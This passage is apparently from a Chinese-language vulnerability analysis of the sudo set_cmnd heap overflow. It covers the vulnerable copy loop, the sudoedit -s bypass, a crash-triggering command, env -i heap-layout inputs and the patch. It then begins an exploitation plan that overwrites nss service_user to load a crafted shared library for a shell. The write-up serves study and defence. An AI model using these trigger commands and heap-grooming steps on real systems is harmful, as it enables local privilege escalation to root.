    <span class="c1">//将命令行参数复制到user_args
</span><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//漏洞点，当以反斜杠结尾时造成heap overflow
</span><span class="c1"></span>        <span class="c1">// sud程序默认每个反斜杠之后必然跟着元字符
</span><span class="c1"></span>        <span class="c1">// 命令行参数以反斜杠结尾from[0]=&#39;\\&#39;, from[1]=null，满足条件
</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">from</span><span class="o">++</span><span class="p">;</span> <span class="c1">// 指向null
</span><span class="c1"></span>        <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span> <span class="c1">//继续加，越过null了，溢出
</span><span class="c1"></span>        <span class="c1">// while循环越界拷贝，内容写入user_args堆块
</span><span class="c1"></span>        <span class="p">}</span>
        <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">*--</span><span class="n">to</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</code></pre></div></li>
<li>
<p>但根据代码，理论在设置了<code>MODE_SHELL(MODE_LOGIN_SHELL)</code>的条件下任何命令行参数都不可能以单个<code>\</code>结尾，因为其在<code>parse_args</code>函数中会对所有的元字符进行转义包括这个<code>\</code></p>
</li>
<li>
<p>对比<code>set_cmnd</code>函数进行复制 与<code>parse_args</code>函数进行转义 时的标志位<code>if</code>条件，得知不设置<code>MODE_RUN</code>标志位而改为设置<code>MODE_EDIT</code>或<code>MODE_CHECK</code>标志位可达到目的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// parse_args
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">mode</span><span class="p">,</span> <span class="n">MODE_RUN</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="p">)){}</span>
<span class="c1">// set_cmnd
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">sudo_mode</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">MODE_RUN</span> <span class="o">|</span> <span class="n">MODE_EDIT</span> <span class="o">|</span> <span class="n">MODE_CHECK</span><span class="p">))</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">sudo_mode</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="o">|</span><span class="n">MODE_LOGIN_SHELL</span><span class="p">)){</span>
<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><ul>
<li>即不设置<code>MODE_RUN</code>的话，<code>parse_args</code>转义条件不满足，但<code>set_cmnd</code>函数中只要<code>MODE_EDIT</code>或<code>MODE_CHECK</code>标志位被触发，复制的条件依然可以满足，可以成功触发漏洞</li>
</ul>
</li>
<li>
<p>从<code>sudo.c</code>的<code>main</code>函数中再次查看设置标志位的条件，通过<code>-e</code>、<code>-l</code>可以设置<code>MODE_EDIT/MODE_CHECK</code>两个标志位，并且设置了<code>MODE_SHELL/MODE_LOGIN_SHELL</code>的话，在后续会被检测到并退出</p>
<ul>
<li>
<p>具体<code>-e</code>、<code>-l</code>代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">case</span> <span class="sc">&#39;e&#39;</span><span class="o">:</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">&amp;&amp;</span> <span class="n">mode</span> <span class="o">!=</span> <span class="n">MODE_EDIT</span><span class="p">)</span>
            <span class="n">usage_excl</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="n">mode</span> <span class="o">=</span> <span class="n">MODE_EDIT</span><span class="p">;</span>
            <span class="n">sudo_settings</span><span class="p">[</span><span class="n">ARG_SUDOEDIT</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="p">;</span>
            <span class="n">valid_flags</span> <span class="o">=</span> <span class="n">MODE_NONINTERACTIVE</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="sc">&#39;l&#39;</span><span class="o">:</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="n">MODE_LIST</span><span class="p">)</span>
                <span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">MODE_LONG_LIST</span><span class="p">);</span>
            <span class="k">else</span>
                <span class="nf">usage_excl</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">mode</span> <span class="o">=</span> <span class="n">MODE_LIST</span><span class="p">;</span>
            <span class="n">valid_flags</span> <span class="o">=</span> <span class="n">MODE_NONINTERACTIVE</span><span class="o">|</span><span class="n">MODE_LONG_LIST</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">mode</span> <span class="o">==</span> <span class="n">MODE_LIST</span><span class="p">)</span>
    <span class="n">mode</span> <span class="o">=</span> <span class="n">MODE_CHECK</span><span class="p">;</span>
</code></pre></div></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// parse_args.c parse_args函数中
</span><span class="c1"></span><span class="k">if</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">valid_flags</span><span class="p">)</span> <span class="o">!=</span> <span class="n">flags</span><span class="p">)</span>
	<span class="n">usage</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// 打印usage，退出
</span></code></pre></div></li>
<li>
<p>但也有例外，通过搜寻<code>MODE_EDIT</code>相关交叉引用，发现<code>sudoedit</code>执行时，同样也在<code>parse_args</code>函数中也可以设置<code>mode=MODE_EDIT</code>，同时没有设置<code>valid_flags</code>，遇到上面的代码也不会检测退出，可以执行实现堆溢出</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// parse_args.c
</span><span class="c1"></span><span class="cm">/* First, check to see if we were invoked as &#34;sudoedit&#34;. */</span>
    <span class="n">proglen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">progname</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">proglen</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">progname</span> <span class="o">+</span> <span class="n">proglen</span> <span class="o">-</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#34;edit&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">progname</span> <span class="o">=</span> <span class="s">&#34;sudoedit&#34;</span><span class="p">;</span>
	<span class="n">mode</span> <span class="o">=</span> <span class="n">MODE_EDIT</span><span class="p">;</span>
	<span class="n">sudo_settings</span><span class="p">[</span><span class="n">ARG_SUDOEDIT</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></li>
<li>
<p>因此，通过<code>sudo edit -s</code> 可以成功设置<code>MODE_EDIT</code>和<code>MODE_SHELL</code>标志位，同时避免了设置<code>MODE_RUN</code>，也不会被检测退出。</p>
<p>如图，参数仅为<code>\</code>，且发送一个超长<code>AAAAA</code>指令，可以成功崩溃</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="err">$</span> <span class="n">sudoedit</span> <span class="o">-</span><span class="n">s</span> <span class="err">&#39;\&#39;</span> <span class="err">`</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;A&#34;</span><span class="o">*</span><span class="mi">65536</span><span class="p">)</span><span class="err">&#39;`</span>
<span class="n">malloc</span><span class="p">()</span><span class="o">:</span> <span class="n">corrupted</span> <span class="n">top</span> <span class="n">size</span>
<span class="n">Aborted</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p>漏洞触发 - 可利用理由</p>
<ul>
<li>
<p>通过<code>sudoedit -s</code>跟着的参数可以控制<code>user_args</code>占用的堆块大小</p>
</li>
<li>
<p>通过环境变量配置<code>env -i</code>可以填入<code>user_args</code>堆块之后的out-of-bound位置</p>
</li>
<li>
<p>在环境变量中通过以\结尾，可以跳转到下一个环境变量</p>
</li>
<li>
<p>漏洞点位置的<code>from[0] = ‘\\’, from[1] = null</code>说明可以跳过单<code>\</code>字符插入<code>0x0</code>并不终止程序</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;/usr/bin/sudoedit&#34;</span><span class="p">,</span> <span class="s">&#34;-s&#34;</span><span class="p">,</span> <span class="s">&#34;AAAAAAAA&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;BBBBBBBB&#34;</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;CCCCCCCC&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">}</span>
<span class="c1">//              这里两个backslash可插入两个null bytes
</span><span class="c1"></span><span class="n">execve</span><span class="p">(</span><span class="s">&#34;/usr/bin/sudoedit&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p>漏洞触发 - 输入</p>
<p><code>env -i</code>设置的环境变量实际上在<code>sudoedit</code>的参数末尾之后的位置进行存储</p>
<ul>
<li>由于堆中chunk的头大小为<code>0x10</code>，对齐为<code>0x10</code>
<ul>
<li><code>env -i 'A=BBBB' sudoedit -s 'CCCCCCCCCCCCCCCC'</code>将<code>0x10</code>字节填入<code>user_args</code>，环境变量的<code>0x6</code>字节则填入接下来的位置</li>
<li><code>env -i 'A=BB' sudoedit -s 'CCCCBBBBBBBB’</code>仅输入<code>0x10</code>字节，</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">env -i &#39;AA=a\&#39; &#39;B=b\&#39; &#39;C=c\&#39; &#39;D=d\&#39; &#39;E=e\&#39; &#39;F=f&#39; sudoedit -s &#39;1234567890123456789012\&#39;</span><span class="w">
</span><span class="w">
</span><span class="w"></span>--<span class="l">|--------+--------+--------+--------|--------+--------+--------+--------+--</span><span class="w">
</span><span class="w">  </span><span class="l">|        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|</span><span class="w">
</span><span class="w"></span>--<span class="l">|--------+--------+--------+--------|--------+--------+--------+--------+--</span><span class="w">
</span><span class="w">              </span><span class="l">head  &lt;---- user_args buffer ----&gt;  size      fd       bk</span><span class="w">
</span></code></pre></div><ul>
<li>一个char字符 - 1字节 - 2个16进制字符 - 8个2进制字符</li>
</ul>
</li>
<li>
<p>补丁分析</p>
<p>补丁在以下链接中可以查看到</p>
<p><a href="https://www.sudo.ws/repos/sudo/rev/049ad90590be">sudo: 049ad90590be</a></p>
<p><img src="https://s2.loli.net/2022/09/23/nku2sjHyE4QTPDr.png" alt=""></p>
<p>可以看到对刚刚出问题<code>set_cmnd</code>函数的标志位<code>if</code>检查重新写了逻辑。</p>
<ul>
<li>刚刚通过<code>sudoedit</code>的方式是开启<code>MODE_EDIT</code>、<code>MODE_SHELL</code>和<code>MODE_CHECK</code>，绕过<code>parse_args</code>函数进行参数转义的判断，同时能运行<code>set_cmnd</code>函数进行堆溢出。</li>
<li>而打补丁后的程序对<code>set_cmnd</code>函数进入原堆溢出点的<code>if</code>条件进行修改，增加了对<code>MODE_RUN</code>的判断，该模式只有通过<code>sudo</code>而非<code>sudoedit</code>运行时才满足，因此原方式失效</li>
</ul>
</li>
</ul>
<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
<h3 id="利用所需信息获取">利用所需信息获取</h3>
<ul>
<li>
<p>从输入到触发漏洞前后的<strong>堆操作轨迹</strong></p>
<p>main函数在调用<code>parse_args</code>对输入参数进行处理前，进行了什么操作</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// sudo.c的main函数中
</span><span class="c1">// 漏洞触发前
</span><span class="c1"></span><span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span> 
<span class="n">bindtextdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">,</span> <span class="n">LOCALEDIR</span><span class="p">);</span>
<span class="n">textdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">);</span>
<span class="c1">//...
</span><span class="c1"></span><span class="cm">/* Fill in user_info with user name, uid, cwd, etc. */</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">user_info</span> <span class="o">=</span> <span class="n">get_user_info</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user_details</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span> <span class="cm">/* get_user_info printed error message */</span>

<span class="cm">/* Disable core dumps if not enabled in sudo.conf. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sudo_conf_disable_coredump</span><span class="p">())</span>
	<span class="n">disable_coredump</span><span class="p">();</span>
<span class="c1">// 紧接着的就是parse_args函数
</span><span class="c1"></span>    <span class="cm">/* Parse command line arguments. */</span>
    <span class="n">sudo_mode</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargc</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nargv</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">settings</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">env_add</span><span class="p">);</span>
    <span class="n">sudo_debug_printf</span><span class="p">(</span><span class="n">SUDO_DEBUG_DEBUG</span><span class="p">,</span> <span class="s">&#34;sudo_mode %d&#34;</span><span class="p">,</span> <span class="n">sudo_mode</span><span class="p">);</span>
</code></pre></div><ul>
<li>
<p><code>setlocale</code>函数中进行了哪些堆操作</p>
<p><code>malloc</code>并<code>free</code>了<code>LC_CTYPE</code>、<code>LC_MESSAGES</code>、<code>LC_TIME</code>等多个环境变量，申请的chunk大小很小，free后归属于tcache bin</p>
</li>
<li>
<p><code>get_user_info</code>函数：调用nss服务【💖】</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span><span class="c1">// tcache
</span><span class="c1"></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x78</span><span class="p">)</span><span class="c1">// 固定0x80 // 释放
</span><span class="c1"></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> 
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span><span class="c1">// 以下均为固定申请，且不会释放
</span><span class="c1"></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x36</span><span class="p">)</span> 
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x16</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="mh">0x36</span><span class="p">)</span><span class="c1">// group files
</span></code></pre></div></li>
</ul>
</li>
<li>
<p>查找<strong>可控数据结构</strong>（仅通过人工分析较复杂，作者是通过类似fuzzing方式获得多个crash，通过回放trace锁定这3个数据结构）</p>
<ul>
<li>
<p><code>sudo_hook_entry</code></p>
</li>
<li>
<p><code>def_timestampdir</code></p>
</li>
<li>
<p><code>service_user</code> in <code>nss</code></p>
<p>开启ASLR，通过前两个变量进行利用需要爆破地址，且目前仅在一个系统环境下复现成功。这个三种环境都支持且不需要爆破</p>
</li>
</ul>
</li>
</ul>
<p>基于上述3个可控数据结构，原作者提出了3种exp方案。具体讨论第3种</p>
<h3 id="可控数据结构service_user变量分析">可控数据结构：<code>service_user</code>变量分析</h3>
<ul>
<li>
<p>**目的：**探索<code>service_user</code>可通过什么方式getshell</p>
</li>
<li>
<p><code>libc</code>中<code>nss</code>过程里对<code>service_user</code>变量的操作分析</p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/nss/nsswitch.c#L401">https://elixir.bootlin.com/glibc/glibc-2.31/source/nss/nsswitch.c#L401</a></p>
<ul>
<li>
<p><code>service_user</code>结构</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">service_user</span>
<span class="p">{</span>
  <span class="cm">/* And the link to the next entry.  */</span>
  <span class="k">struct</span> <span class="nc">service_user</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
  <span class="cm">/* Action according to result.  */</span>
  <span class="n">lookup_actions</span> <span class="n">actions</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
  <span class="cm">/* Link to the underlying library object.  */</span>
  <span class="n">service_library</span> <span class="o">*</span><span class="n">library</span><span class="p">;</span>
  <span class="cm">/* Collection of known functions.  */</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">known</span><span class="p">;</span>
  <span class="cm">/* Name of the service (`files&#39;, `dns&#39;, `nis&#39;, ...).  */</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span> <span class="n">service_user</span><span class="p">;</span>
</code></pre></div></li>
<li>
<p><code>glibc-2.31/nss/nsswitch.c</code>中运行<code>__nss_lookup_function</code>函数→<code>nss_load_library</code>函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">int</span>
<span class="nf">nss_load_library</span> <span class="p">(</span><span class="n">service_user</span> <span class="o">*</span><span class="n">ni</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span> <span class="c1">// 这里！！！
</span><span class="c1"></span>      <span class="k">static</span> <span class="n">name_database</span> <span class="n">default_table</span><span class="p">;</span>
      <span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">=</span> <span class="n">nss_new_service</span> <span class="p">(</span><span class="n">service_table</span> <span class="o">?:</span> <span class="o">&amp;</span><span class="n">default_table</span><span class="p">,</span>
				     <span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Load the shared library.  */</span>
      <span class="n">size_t</span> <span class="n">shlen</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span>
		      <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">__nss_shlib_revision</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
      <span class="kt">int</span> <span class="n">saved_errno</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
      <span class="kt">char</span> <span class="n">shlib_name</span><span class="p">[</span><span class="n">shlen</span><span class="p">];</span>

      <span class="cm">/* Construct shared object name.  */</span>
      <span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">,</span>
					      <span class="s">&#34;libnss_&#34;</span><span class="p">),</span>
				    <span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">),</span>
			  <span class="s">&#34;.so&#34;</span><span class="p">),</span> <span class="c1">// 字符串拼接
</span><span class="c1"></span>		<span class="n">__nss_shlib_revision</span><span class="p">);</span>

      <span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">=</span> <span class="n">__libc_dlopen</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">);</span>
      <span class="c1">//加载动态链接库
</span></code></pre></div><p>若<code>ni-&gt;library = NULL</code>，则会调用<code>nss_new_service</code>函数为其分配一个堆块，并对该<code>service_user</code>的<code>name,lib_handle,next</code>进行赋值</p>
<p>完成后进入<code>if (ni-&gt;library-&gt;lib_handle == NULL)</code>分支，对<code>name</code>进行字符串拼接，也就是<code>libnss_+name+'.so.2</code>’，之后才通过<code>__libc_dlopen</code>函数加载该动态链接库</p>
</li>
</ul>
<ol>
<li>
<p>可能的getshell思路</p>
<p><code>ni-&gt;library-&gt;lib_handle = __libc_dlopen(shlib_name)</code> 加载自定义的<code>.so.2</code>库：</p>
<ul>
<li>通过溢出更改<code>libnss_xxx.so.2</code>的<code>xxx</code>即<code>name</code>部分为<code>x/x</code>，可变成<code>libnss_x/x.so.2</code>，其他部分为<code>00000</code></li>
<li>将<code>getshell</code>的代码写入<code>_init</code>之后编译为动态链接库，即可获得shell</li>
</ul>
</li>
</ol>
</li>
<li>
<p>从<code>sudo</code>程序通过<code>get_user_info</code>函数调用<code>nss</code>服务的分析</p>
<ul>
<li>
<p>在<code>sudo.c:191</code>会调用<code>get_user_info</code>函数获取用户信息，需要通过<code>nss</code>服务获取用户的用户名和口令信息（<code>passwd</code>对应的服务规范，在函数中会调用根据配置文件初始化<code>group files</code>等服务规范）</p>
<p><img src="https://p3.ssl.qhimg.com/t017c2687cdf250009f.png" alt="https://p3.ssl.qhimg.com/t017c2687cdf250009f.png"></p>
<ul>
<li>
<p>动态分析，配置文件中所有的服务规范全部处理完毕之后，生成链表依次存储每个服务，表头存储在<code>libc</code>中。通过搜索固定的<code>passwd</code>等服务，可以通过链表结构追溯到我们想要替换的nss <code>service_user</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">service_table</span>
<span class="err">$</span><span class="mi">52</span> <span class="o">=</span> <span class="p">(</span><span class="n">name_database</span> <span class="o">**</span><span class="p">)</span> <span class="mh">0x7ffff7f457a8</span> <span class="o">&lt;</span><span class="n">service_table</span><span class="o">&gt;</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">service_table</span>
<span class="err">$</span><span class="mi">53</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">entry</span> <span class="o">=</span> <span class="mh">0x5555555829d0</span><span class="p">,</span>
  <span class="n">library</span> <span class="o">=</span> <span class="mh">0x0</span>
<span class="p">}</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">service_table</span><span class="o">-&gt;</span><span class="n">entry</span>
<span class="err">$</span><span class="mi">54</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">next</span> <span class="o">=</span> <span class="mh">0x555555582a70</span><span class="p">,</span>
  <span class="n">service</span> <span class="o">=</span> <span class="mh">0x5555555829f0</span><span class="p">,</span>
  <span class="n">name</span> <span class="o">=</span> <span class="mh">0x5555555829e0</span> <span class="s">&#34;passwd&#34;</span>
<span class="p">}</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">service_table</span><span class="o">-&gt;</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span>
<span class="err">$</span><span class="mi">55</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">next</span> <span class="o">=</span> <span class="mh">0x5555555885b0</span><span class="p">,</span>
  <span class="n">service</span> <span class="o">=</span> <span class="mh">0x555555588530</span><span class="p">,</span>
  <span class="n">name</span> <span class="o">=</span> <span class="mh">0x555555582a80</span> <span class="s">&#34;group&#34;</span>
<span class="p">}</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">service_table</span><span class="o">-&gt;</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">service</span>
<span class="err">$</span><span class="mi">56</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">next</span> <span class="o">=</span> <span class="mh">0x555555588570</span><span class="p">,</span>
  <span class="n">actions</span> <span class="o">=</span> <span class="p">{</span><span class="n">NSS_ACTION_CONTINUE</span><span class="p">,</span> <span class="n">NSS_ACTION_CONTINUE</span><span class="p">,</span> <span class="n">NSS_ACTION_CONTINUE</span><span class="p">,</span> <span class="n">NSS_ACTION_RETURN</span><span class="p">,</span> <span class="n">NSS_ACTION_RETURN</span><span class="p">},</span>
  <span class="n">library</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">known</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">name</span> <span class="o">=</span> <span class="mh">0x555555588560</span> <span class="s">&#34;files&#34;</span>
<span class="p">}</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="可操作free原语setlocale配置">可操作free原语：<code>setlocale</code>配置</h3>
<ul>
<li>
<p>刚刚分析最终getshell需要的<code>service name</code>数据结构与<code>user_args</code>结构通过什么方式布局相邻？</p>
<ul>
<li>为了防止溢出过程中覆写中间的关键结构体，<code>user_args</code>与<code>service_user</code>之间的距离要尽可能的小，最好的方法就是在<code>service_user</code>上方人为释放一个堆块，之后<code>user_args</code>再申请该堆块进行溢出</li>
</ul>
</li>
<li>
<p><code>sudo</code>在<code>main</code>函数的起始位置<code>sudo.c:154</code>调用了<code>setlocale(LC_ALL, &quot;&quot;);</code>函数</p>
<ul>
<li>其中<code>locale=&quot;&quot;</code>表示根据环境变量来设置<code>locale</code></li>
<li>该过程中申请和释放大量的堆块。</li>
</ul>
</li>
<li>
<p><code>setlocale(LC_ALL, &quot;&quot;)</code>函数源码分析</p>
<p><code>malloc</code>并<code>free</code>了<code>LC_CTYPE</code>、<code>LC_MESSAGES</code>、<code>LC_TIME</code>等多个环境变量，申请的chunk大小很小，free后归属于tcache bin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//setlocale(LC_ALL, &#34;&#34;);
</span><span class="c1">//glibc/locale/setlocale.c
</span><span class="c1"></span><span class="kt">char</span> <span class="o">*</span>
<span class="nf">setlocale</span> <span class="p">(</span><span class="kt">int</span> <span class="n">category</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">locale</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">category</span> <span class="o">==</span> <span class="n">LC_ALL</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="c1">//...
</span><span class="c1"></span>
    <span class="cm">/* Load the new data for each category.  */</span>
